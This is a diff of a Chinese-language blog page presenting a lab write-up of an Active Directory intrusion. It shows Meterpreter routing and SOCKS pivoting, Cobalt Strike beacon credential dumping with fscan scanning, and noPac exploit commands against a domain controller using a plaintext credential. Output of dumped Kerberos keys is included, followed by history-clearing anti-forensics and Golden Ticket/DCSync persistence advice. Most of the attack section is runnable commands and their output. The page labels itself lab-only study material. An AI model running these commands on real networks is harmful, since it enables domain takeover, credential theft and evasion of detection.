+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>dynamic_chain
+</span></span><span style="display:flex;"><span>proxy_dns
+</span></span><span style="display:flex;"><span>tcp_read_time_out <span style="color:#ae81ff">15000</span>
+</span></span><span style="display:flex;"><span>tcp_connect_time_out <span style="color:#ae81ff">8000</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>ProxyList<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>socks4 127.0.0.1 <span style="color:#ae81ff">1080</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 添加路由部分</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># autoroute 是 Meterpreter 的脚本，-s 10.10.10.0/24：告诉 Meterpreter，你希望访问这个子网。</span>
+</span></span><span style="display:flex;"><span>meterpreter &gt; run autoroute -s 10.10.10.0/24
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Example: run post/multi/manage/autoroute OPTION<span style="color:#f92672">=</span>value <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Adding a route to 10.10.10.0/255.255.255.0...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Added route to 10.10.10.0/255.255.255.0 via 192.168.226.197
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Use the -p option to list all active routes
+</span></span><span style="display:flex;"><span>meterpreter &gt; background
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Backgrounding session 1...
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 验证：所有发送到 10.10.10.0/24 的流量会通过 Session 1 这台跳板机。</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>use server/socks_proxy
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; route print
+</span></span><span style="display:flex;"><span>IPv4 Active Routing Table
+</span></span><span style="display:flex;"><span><span style="color:#f92672">=========================</span>
+</span></span><span style="display:flex;"><span>   Subnet             Netmask            Gateway
+</span></span><span style="display:flex;"><span>   ------             -------            -------
+</span></span><span style="display:flex;"><span>   10.10.10.0         255.255.255.0      Session <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 设置 SOCKS Proxy 部分</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; use auxiliary/server/socks_proxy
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; set VERSION <span style="color:#ae81ff">5</span>
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; set SRVHOST 127.0.0.1
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; set SRVPORT <span style="color:#ae81ff">9050</span>
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; run
+</span></span><span style="display:flex;"><span>msf auxiliary<span style="color:#f92672">(</span>server/socks_proxy<span style="color:#f92672">)</span> &gt; 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 跳板建立验证，扫描网段内一个主机的445端口</span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# proxychains4 nmap -sT -Pn -n -p <span style="color:#ae81ff">445</span> 10.10.10.140
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.140
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.072s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.09 seconds
+</span></span></code></pre></div><h2 id="域信息收集">域信息收集<a hidden class="anchor" aria-hidden="true" href="#域信息收集">#</a></h2>
+<p>域用户登录win7：<code>nasa\test,QWEasd!@#999</code></p>
+<p>win7：beacon&gt; logonpasswords</p>
+<p>beacon执行<code>shell ipconfig</code>发现还有一个网段：<code>10.10.10.0/24</code></p>
+<p>使用fscan进行探测<code>10.10.10.0/24</code>网段</p>
+<pre tabindex="0"><code>[04/18 19:18:15] beacon&gt; shell fscan2020.exe -h 10.10.10.0/24 -np -no
+[04/18 19:18:15] [*] Tasked beacon to run: fscan2020.exe -h 10.10.10.0/24 -np -no
+[04/18 19:18:15] [+] host called home, sent: 69 bytes
+[04/18 19:18:25] [+] received output:
+
+
+   ___                              _    
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+10.10.10.142:135 open
+10.10.10.140:135 open
+10.10.10.140:80 open
+10.10.10.137:135 open
+10.10.10.137:80 open
+10.10.10.140:445 open
+10.10.10.140:443 open
+10.10.10.141:135 open
+10.10.10.137:445 open
+10.10.10.142:445 open
+10.10.10.141:445 open
+
+[04/18 19:18:36] [+] received output:
+10.10.10.142	MS17-010	(Windows 7 Ultimate 7601 Service Pack 1)
+NetInfo:
+[*]10.10.10.142
+   [-&gt;]win7
+   [-&gt;]10.10.10.142
+   [-&gt;]192.168.226.197
+NetInfo:
+[*]10.10.10.140
+   [-&gt;]ad01
+   [-&gt;]10.10.10.140
+NetInfo:
+[*]10.10.10.137
+   [-&gt;]win2003
+   [-&gt;]10.10.10.137
+   [-&gt;]192.168.226.144
+10.10.10.137	MS17-010	(Windows Server 2003 3790 Service Pack 2)
+NetInfo:
+[*]10.10.10.141
+   [-&gt;]ad02
+   [-&gt;]10.10.10.141
+
+[04/18 19:18:37] [+] received output:
+WebTitle:http://10.10.10.140:80 403 None
+WebTitle:http://10.10.10.137:80 200 None
+</code></pre><h2 id="ad-nopac">AD (noPac)<a hidden class="anchor" aria-hidden="true" href="#ad-nopac">#</a></h2>
+<p>CVE-2021-42278 &amp; CVE-2021-42287 攻击域控</p>
+<p><strong>第一步：扫描目标是否 vulnerable（强烈建议先扫）</strong>：</p>
+<pre tabindex="0"><code>proxychains4 python3 noPac.py nasa.gov/test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140
+</code></pre><p>如果显示 vulnerable，就可以继续 exploit。</p>
+<p><strong>第二步：利用 noPac 提权（常见姿势）</strong></p>
 <ul>
-<li>在 Win7 上用域用户 nasa\test 登录，mimikatz 抓取凭证：
-<ul>
-<li>nasa\test : QWEasd!@#999</li>
-<li>其他本地/域机器哈希</li>
+<li><strong>获取高权限票据</strong>：</li>
 </ul>
-</li>
-<li>fscan 内网扫描确认域控 10.10.10.140（AD01）开放 445/389/636 等端口。</li>
+<pre tabindex="0"><code>proxychains4 python3 noPac.py nasa.gov/test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140 --impersonate administrator
+</code></pre><ul>
+<li><strong>直接拿 shell</strong>：</li>
 </ul>
-<h3 id="6-nopaccve-2021-42278--cve-2021-42287打域控">6. noPac（CVE-2021-42278 + CVE-2021-42287）打域控<a hidden class="anchor" aria-hidden="true" href="#6-nopaccve-2021-42278--cve-2021-42287打域控">#</a></h3>
-<p><strong>第一步：扫描是否可利用</strong></p>
-<p>Bash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>proxychains4 python3 noPac.py nasa.gov/test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140
-</span></span></code></pre></div><p><strong>第二步：利用</strong></p>
-<p>Bash</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>proxychains4 python3 noPac.py nasa.gov/test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140 \
-</span></span><span style="display:flex;"><span>  --impersonate administrator -dump
-</span></span></code></pre></div><p><strong>执行结果</strong>：</p>
-<ul>
-<li>成功添加临时机器账户并 spoof sAMAccountName。</li>
-<li>获得 administrator 的 TGT（.ccache 文件）。</li>
-<li>完整 dump 出 SAM、LSA Secrets、NTDS 所有域用户哈希和 Kerberos keys（含 krbtgt）。</li>
+<pre tabindex="0"><code>proxychains4 python3 noPac.py Dnasa.gov/test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140 --impersonate administrator -shell
+</code></pre><ul>
+<li><strong>Dump hash（常见目标）</strong>：</li>
 </ul>
-<p><strong>注意</strong>：执行结束后会出现清理阶段的非致命报错（删除临时计算机账户失败、服务停止失败、Python Bad file descriptor），<strong>不影响已获取的票据和哈希</strong>。</p>
-<h3 id="7-痕迹清理建议推荐">7. 痕迹清理建议（推荐）<a hidden class="anchor" aria-hidden="true" href="#7-痕迹清理建议推荐">#</a></h3>
-<ol>
-<li><strong>删除临时计算机账户</strong>（最重要）：Bash</li>
-</ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>export KRB5CCNAME=administrator_AD01.nasa.gov.ccache
+<pre tabindex="0"><code>proxychains4 python3 noPac.py nasa.gov/test:&#39;QWEasd!@#999&#39; -dc-ip 10.10.10.140 --impersonate administrator -dump
+</code></pre><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/noPac-main<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# proxychains4 python noPac.py nasa.gov/test:<span style="color:#e6db74">&#39;QWEasd!@#999&#39;</span> -dc-ip 10.10.10.140 -dc-host AD01 --impersonate administrator -dump
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>proxychains<span style="color:#f92672">]</span> config file found: /etc/proxychains4.conf
+</span></span><span style="display:flex;"><span>AD01$:aes256-cts-hmac-sha1-96:5b99a71e5d0274f24153ce9c8e1d85417f6133e2403fa9a77d0015b5f7f7de09
+</span></span><span style="display:flex;"><span>AD01$:aes128-cts-hmac-sha1-96:8b2e6c80caea337d3d8e319fb91df611
+</span></span><span style="display:flex;"><span>AD01$:des-cbc-md5:d9f26d5879347fcd
+</span></span><span style="display:flex;"><span>AD02$:aes256-cts-hmac-sha1-96:3a6d1aaa79853b28a4e0c3bffa83213c2e46513b8ab90c2d52782fc6f31115e2
+</span></span><span style="display:flex;"><span>AD02$:aes128-cts-hmac-sha1-96:73eb19685f294c87d6b1c89230d9b1b9
+</span></span><span style="display:flex;"><span>AD02$:des-cbc-md5:928c675bf40ee319
+</span></span><span style="display:flex;"><span>WIN7$:aes256-cts-hmac-sha1-96:21dec920ffa03eaa7ea50570dff0c1de279e37de20d07e72cd6b8ccdecfc966d
+</span></span><span style="display:flex;"><span>WIN7$:aes128-cts-hmac-sha1-96:0d79ea7e2d31f323d8b15f70c563e3e8
+</span></span><span style="display:flex;"><span>WIN7$:des-cbc-md5:2fd3dcb6ba2685c2
+</span></span><span style="display:flex;"><span>WIN-1EASNY7BHEK$:aes256-cts-hmac-sha1-96:4952733c099698a5e14a7b10fd66598e8b4b9e8a14fd2440bfc3dda5d7f88e7e
+</span></span><span style="display:flex;"><span>WIN-1EASNY7BHEK$:aes128-cts-hmac-sha1-96:1b973d65577282faecfcc5185019d72c
+</span></span><span style="display:flex;"><span>WIN-1EASNY7BHEK$:des-cbc-md5:68adf132703162ae
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>后面那些报错都是 **noPac 工具在清理阶段** 产生的**非致命错误**，不会影响你已经拿到的 Administrator 票据（<span style="color:#e6db74">`</span>.ccache<span style="color:#e6db74">`</span> 文件）和完整 dump 的 hashes/keys。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### 1. 删除机器账户失败（最常见的那个）</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attempting to del a computer with the name: WIN-1EASNY7BHEK$
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Delete computer WIN-1EASNY7BHEK$ Failed! Maybe the current user does not have permission.
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Pls make sure your choice hostname and the -dc-ip are same machine !!
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**原因**：noPac 在攻击过程中临时创建了一个机器账户（WIN-1EASNY7BHEK$），用来 spoof sAMAccountName。攻击结束后尝试自动删除但清理失败。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**影响**：几乎没有影响。攻击已经成功，票据和 dump 都拿到了。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### 2. 停止 RemoteRegistry 服务失败</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**原因**：noPac 为了 dump SAM/LSA/NTDS，临时启动了目标 DC 上的 RemoteRegistry 服务。停止时发现有其他服务依赖它。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**影响**：无影响。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">### 3. Python Exception（Bad file descriptor）</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**原因**：impacket 库在清理 Registry 对象时的资源释放问题，属于 Python + impacket 在异常退出或网络代理环境下的<span style="color:#e6db74">&#34;噪音&#34;</span>错误。
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>**影响**：完全无影响。
+</span></span></code></pre></div><h2 id="痕迹清理">痕迹清理<a hidden class="anchor" aria-hidden="true" href="#痕迹清理">#</a></h2>
+<p><strong>删除临时计算机账户</strong>（最重要）：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>administrator_AD01.nasa.gov.ccache
 </span></span><span style="display:flex;"><span>python3 -m impacket.ldap_shell nasa.gov/Administrator -dc-ip 10.10.10.140 -no-pass -k
-</span></span><span style="display:flex;"><span># 在 shell 中执行：delete computer WIN-1EASNY7BHEK$
-</span></span></code></pre></div><ol start="2">
-<li><strong>清理本地痕迹</strong>：Bash</li>
-</ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>rm -f *.ccache
-</span></span><span style="display:flex;"><span>history -c &amp;&amp; history -w
-</span></span></code></pre></div><ol start="3">
-<li><strong>后续持久化推荐</strong>：
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 在 shell 中执行：delete computer WIN-1EASNY7BHEK$</span>
+</span></span></code></pre></div><p><strong>清理本地痕迹</strong>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>rm -f *.ccache
+</span></span><span style="display:flex;"><span>history -c <span style="color:#f92672">&amp;&amp;</span> history -w
+</span></span></code></pre></div><p><strong>后续持久化推荐</strong>：</p>
 <ul>
 <li>使用 krbtgt hash 制作 <strong>Golden Ticket</strong>。</li>
 <li>DCSync 持续同步哈希。</li>
 <li>避免直接修改普通用户密码（对已拿票据无效），真正有效的防守是重置 krbtgt 密码两次 + 打补丁 + 关闭 MachineAccountQuota。</li>
-</ul>
-</li>
-</ol>
-<h3 id="总结与收获">总结与收获<a hidden class="anchor" aria-hidden="true" href="#总结与收获">#</a></h3>
-<ul>
-<li><strong>外网</strong>：合理利用业务系统安装向导的代码注入是最快路径。</li>
-<li><strong>内网</strong>：经典 MS17-010 在老系统上依然威力巨大。</li>
-<li><strong>域控</strong>：noPac 在 MachineAccountQuota 未限制的环境下几乎是“核弹级”利用。</li>
-<li><strong>工具链</strong>：Metasploit + Cobalt Strike + proxychains + noPac 配合完美。</li>
 </ul>
 <p><strong>声明</strong>：本文仅用于学习和靶场复现，请在授权环境下进行测试，严禁用于非法用途。</p>
 
@@ -489,6 +645,8 @@
       <li><a href="https://Doraemon0358.github.io/tags/nopac/">NoPac</a></li>
       <li><a href="https://Doraemon0358.github.io/tags/eternalblue/">EternalBlue</a></li>
       <li><a href="https://Doraemon0358.github.io/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a></li>
+      <li><a href="https://Doraemon0358.github.io/tags/docker%E9%80%83%E9%80%B8/">Docker逃逸</a></li>
+      <li><a href="https://Doraemon0358.github.io/tags/suid%E6%8F%90%E6%9D%83/">SUID提权</a></li>
     </ul>
 <nav class="paginav">
   <a class="prev" href="https://Doraemon0358.github.io/posts/mcp%E5%8E%9F%E7%90%86ida-pro-mcp%E4%B8%BA%E4%BE%8B/">
